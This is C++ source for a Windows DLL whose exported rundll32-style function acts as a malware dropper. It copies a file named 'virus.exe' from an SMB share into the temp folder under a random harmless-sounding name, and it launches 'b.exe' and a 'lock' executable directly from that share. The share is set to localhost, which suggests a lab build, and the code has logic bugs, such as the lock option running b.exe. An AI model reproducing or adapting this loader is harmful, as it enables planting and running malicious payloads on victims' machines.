// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <iostream>
#include <wchar.h>
#include <pathcch.h>
#include <string.h>
#include <vector>
#include <sstream>
#include <stdlib.h>

#pragma comment(lib, "Pathcch.lib")

const int number_of_elements = 4;
const wchar_t  * legit_files[] = { L"shahar", L"ziv", L"daniel", L"blabla" };

const wchar_t * remote_base_path = L"\\\\127.0.0.1\\c$\\Users\\shahar\\Desktop";

const wchar_t * remote_b_exe = L"b.exe";
const wchar_t * remote_lock_exe = L"winook.exe";

// Get the name of the file to download.
// Returns the local path of the file (if succeed, NULL on failure.)
// *******The local path needs to be freed when not used.*****
WCHAR * get_remote_file(const wchar_t * download_file)
{
	// Count of random names.
	int random_names_count = sizeof(legit_files) / sizeof(legit_files[0]);

	// Random value to choise the local file name.
	int random_value = rand() % random_names_count;
	if (random_value < 0 || random_value > 3)
	{
		printf("[-] Random went terribly wrong. random_value: %d\n", random_value);
		printf("[-] Setting random value to 0.\n");
		random_value = 0;
	}

	int return_value;

	// We return temp_path, so the caller must remember to free it.
	WCHAR * temp_path = (WCHAR *)malloc(MAX_PATH);
	return_value = GetTempPath(MAX_PATH, temp_path);
	if (return_value == 0)
	{
		printf("[-] GetTempPath failed. Error: %d\n", GetLastError());
		return NULL;
	}

	// Creating the local path (temp_path + random file name, e.g c:\windows\temp\legitfile.txt)
	HRESULT hresult_return_value = PathCchAppend(temp_path, return_value, legit_files[random_value]);
	if (hresult_return_value != S_OK)
	{
		printf("[-] Could not create local file path string. HRESULT error: %ld\n", hresult_return_value);
		return NULL;
	}

	// Declaring the remote path variable.
	size_t size_of_remote_base_path = (wcslen(remote_base_path) + 1) * sizeof(wchar_t);
	wchar_t * finale_remote_path = (wchar_t *)malloc(size_of_remote_base_path);

	// Copying the path to a variable (not constant).
	return_value = wcscpy_s(finale_remote_path, size_of_remote_base_path / sizeof(wchar_t), remote_base_path);
	if (return_value != 0)
	{
		printf("[-] Error: error on wcscpy_s: %d.\n", return_value);
		return NULL;
	}

	// Creating the remote path (remote path + the downloadl_file parameter)
	hresult_return_value = PathCchAppend(finale_remote_path, wcslen(finale_remote_path) + 1, download_file);
	if (hresult_return_value != S_OK)
	{
		printf("[-] Could not create remote file path string. HRESULT error: %ld\n", hresult_return_value);
		return NULL;
	}

	// Copying remote file to local path.
	return_value = CopyFile(finale_remote_path, temp_path, false);
	if (return_value == 0)
	{
		printf("[-] Failed to CopyFile.\n");
		return NULL;
	}

	free(finale_remote_path);

	// The local file path. ****Important: It is from the heap, so free it when you are done with it.****
	return temp_path;
}

// Running exe file from remote path (defined).
int run_remote_exe(const wchar_t * exefile)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	int return_value; // Return value.
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));

	HRESULT hresult_return_value;

	// Copying the constant remote path to a variable.
	size_t size_of_remote_path = (wcslen(remote_base_path) + 1) * sizeof(wchar_t);
	wchar_t * finale_remote_path = (wchar_t *)malloc(size_of_remote_path);
	return_value = wcscpy_s(finale_remote_path, size_of_remote_path / sizeof(wchar_t), remote_base_path);
	if (return_value != 0)
	{
		printf("[-] Error: error on wcscpy_s: %d.\n", return_value);
		return 0;
	}

	// Creating the remote path (remote path + the downloadl_file parameter)
	hresult_return_value = PathCchAppend(finale_remote_path, wcslen(finale_remote_path) + 1, exefile);
	if (hresult_return_value != S_OK)
	{
		printf("[-] Could not create remote exe file path string. HRESULT error: %ld\n", hresult_return_value);
		return 0;
	}

	// Creating child process.
	return_value = CreateProcess(NULL,
		finale_remote_path,
		NULL,
		NULL,
		true,
		NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
		NULL,
		NULL,
		&si,
		&pi);

	if (return_value == 0)
	{
		wprintf(L"[-] Error creating process: %s. \nError: %d.\n", exefile, GetLastError());
		return 0;
	}
	wprintf(L"[+] Succeed creating process %s.\n", exefile);
	free(finale_remote_path);
	return 1;
}

// This functions gets a wstring and return a vector of the sub wstrings splitted by space.
std::vector<std::wstring> split_string_by_space(std::wstring to_split)
{
	
	std::wstring temp;
	std::vector<std::wstring> to_return;
	std::wstringstream wss(to_split);

	// Getline copy from the stream(wss) to temp the string until the space.
	while (std::getline(wss, temp, L' '))
		// adding each returned wstring to the vector.
		to_return.push_back(temp);

	return to_return;
}

std::vector<std::wstring> parse_lpszcmdline_to_wstring_vector(LPSTR lpszCmdLine)
{
	// length of original command line.
	size_t size_of_args = strlen(lpszCmdLine) + 1;

	// command line will be stored at this widechar string.
	wchar_t * w_args = new wchar_t[size_of_args + 1];
	// Converting ascii string (LPSTR) command line to wide-char command line.
	size_t number_of_charecter_converterd;
	mbstowcs_s(&number_of_charecter_converterd, w_args, size_of_args, lpszCmdLine, size_of_args - 1);

	// Splitting the wide-char string by spaces. results in vector.
	std::vector<std::wstring> splitted = split_string_by_space(w_args);

	// Returning vector.
	return splitted;
}

// Main function.
extern "C" __declspec(dllexport) int run_exe_from_netapp(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	bool virus = false, b = false, lock = false;
	// Parsing arguments from command line.
	std::vector<std::wstring> splitted_commandline = parse_lpszcmdline_to_wstring_vector(lpszCmdLine);

	// Iterating arguments.
	for (std::vector<std::wstring>::iterator it = splitted_commandline.begin(); it != splitted_commandline.end(); ++it)
	{
		virus = virus || (*it).compare(L"v") || (*it).compare(L"V");
		b = b || (*it).compare(L"b") || (*it).compare(L"B");
		lock = lock || (*it).compare(L"l") || (*it).compare(L"L");
	}
	if (virus)
	{
		wchar_t * local_virus = get_remote_file(L"virus.exe");
		if (local_virus != NULL)
		{
			wprintf(L"[+] Succeed got virus %s.\n", local_virus);
		}
		else
		{
			wprintf(L"[-] Failed to get virus copied.\n");
		}
		free(local_virus);
	}
	if (b)
	{
		wprintf(L"[+] Trying to run remote b exe. \n");
		int result = run_remote_exe(remote_b_exe);
		if (result)
			wprintf(L"[+] Succeed to run remote exe of B.\n");
		else
			wprintf(L"[-] Failed to run remote exe of B.\n");
	}
	if (lock)
	{
		wprintf(L"[+] Trying to run remote lock exe. \n");
		int result = run_remote_exe(remote_b_exe);
		if (result)
			wprintf(L"[+] Succeed to run remote exe of lock.\n");
		else
			wprintf(L"[-] Failed to run remote exe of lock.\n");
	}
	return 0;
}